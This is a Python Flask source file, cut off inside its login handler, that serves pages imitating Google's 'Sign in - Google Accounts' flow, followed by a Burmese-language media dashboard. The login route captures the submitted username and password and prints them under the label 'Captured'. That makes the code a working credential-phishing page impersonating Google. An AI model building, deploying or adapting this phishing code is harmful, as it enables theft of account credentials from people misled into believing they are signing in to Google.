from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

email_html = """
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        body {
            background-color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 40px 30px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: left;
        }
        .google-logo {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 15px;
        }
        h2 {
            font-size: 24px;
            font-weight: normal;
            margin-bottom: 8px;
            color: #202124;
        }
        p {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        .input-box {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: 1px solid #747775;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
            margin-bottom: 10px;
        }
        .input-box:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }
        .link {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            display: inline-block;
            margin-bottom: 30px;
        }
        .link:hover {
            text-decoration: underline;
        }
        .next-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 20px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            float: right;
        }
        .next-btn:hover {
            background-color: #1b66c9;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-logo">
            <span style="color:#4285F4;">G</span><span style="color:#EA4335;">o</span><span style="color:#FBBC05;">o</span><span style="color:#4285F4;">g</span><span style="color:#34A853;">l</span><span style="color:#EA4335;">e</span>
        </div>
        <h2>Sign in</h2>
        <p>Use your Google Account.</p>
        
        <form action="/password" method="POST">
            <input type="text" name="username" placeholder="Email or phone" required class="input-box">
            <br>
            <a href="#" class="link">Forgot email?</a>
            <br><br>
            <a href="#" class="link" style="display:block;">Create account</a>
            
            <button type="submit" class="next-btn">Next</button>
        </form>
    </div>
</body>
</html>
"""
password_html = """
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        body {
            background-color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 40px 30px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: left;
        }
        .google-logo {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 15px;
        }
        h2 {
            font-size: 24px;
            font-weight: normal;
            margin-bottom: 8px;
            color: #202124;
        }
        .user-pill {
            display: inline-flex;
            align-items: center;
            border: 1px solid #dadce0;
            border-radius: 20px;
            padding: 4px 12px;
            margin-bottom: 25px;
            font-size: 14px;
            color: #202124;
        }
        .input-box {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: 1px solid #747775;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
            margin-bottom: 15px;
        }
        .input-box:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }
        .link {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            display: inline-block;
            margin-bottom: 30px;
        }
        .link:hover {
            text-decoration: underline;
        }
        .next-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 20px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            float: right;
        }
        .next-btn:hover {
            background-color: #1b66c9;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-logo">
            <span style="color:#4285F4;">G</span><span style="color:#EA4335;">o</span><span style="color:#FBBC05;">o</span><span style="color:#4285F4;">g</span><span style="color:#34A853;">l</span><span style="color:#EA4335;">e</span>
        </div>
        <h2>Welcome</h2>
        <div class="user-pill">👤 {{ username }}</div>
        
        <form action="/login" method="POST">
            <input type="hidden" name="username" value="{{ username }}">
            <input type="password" name="password" placeholder="Enter your password" required class="input-box">
            <br>
            <a href="#" class="link">Forgot password?</a>
            <br><br>
            
            <button type="submit" class="next-btn">Next</button>
        </form>
    </div>
</body>
</html>
"""
Dashboard_html = """
<!DOCTYPE html>
<html>
<head>
    <title>My Web App - Dashboard</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .header {
            background-color: #1a73e8;
            color: white;
            padding: 15px;
            border-radius: 8px;
        }
        .search-box {
            margin: 20px auto;
            max-width: 600px;
        }
        .search-box input {
            width: 70%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 25px 0 0 25px;
            outline: none;
        }
        .search-box button {
            width: 25%;
            padding: 12px;
            font-size: 16px;
            background-color: #1a73e8;
            color: white;
            border: 1px solid #1a73e8;
            border-radius: 0 25px 25px 0;
            cursor: pointer;
        }
        .content {
            margin-top: 20px;
        }
        .card {
            background: white;
            padding: 20px;
            margin: 15px auto;
            max-width: 600px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Welcome, {{ username }}! 🎉</h1>
        <p>ඔသင့်ရဲ့ ကိုယ်ပိုင် Dashboard မှ ကြိုဆိုပါတယ်</p>
    </div>

    <!-- Search Bar အသစ် -->
    <div class="search-box">
    <form action="" method="GET">
  <input type="text" name="query" placeholder="သီချင်း သို့မဟုတ် ဗီဒီယို ရှာရန်...">
        <button type="submit">ရှာမည်</button>
    </form>
</div>
   <div class="content">
        {% if show_music %}
        <div class="card">
            <h3>🎵 Music Player</h3>
            <p>ကြိုက်နှစ်သက်ရာ သီချင်းများ နားဆင်ရန်</p>
            <audio controls style="width: 100%;">
                <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
                Your browser does not support the audio element.
            </audio>
        </div>
        {% endif %}
        
        {% if show_video %}
        <div class="card">
            <h3>📺 Video Player</h3>
            <p>ဗီဒီယိုများ ကြည့်ရှုရန်</p>
            <iframe width="100%" height="315" src="https://www.youtube.com/embed/tgbNymZ7vqY" frameborder="0" allowfullscreen></iframe>
        </div>
        {% endif %}
    </div>
    
</body>
</html>
"""
@app.route("/login", methods=["GET", "POST"])
def login():
    username = "User"
    if request.method == "POST":
        username = request.form.get("username", "User")
        password = request.form.get("password")
        print(f"Captured -> Username: {username}, Password: {password}")
        
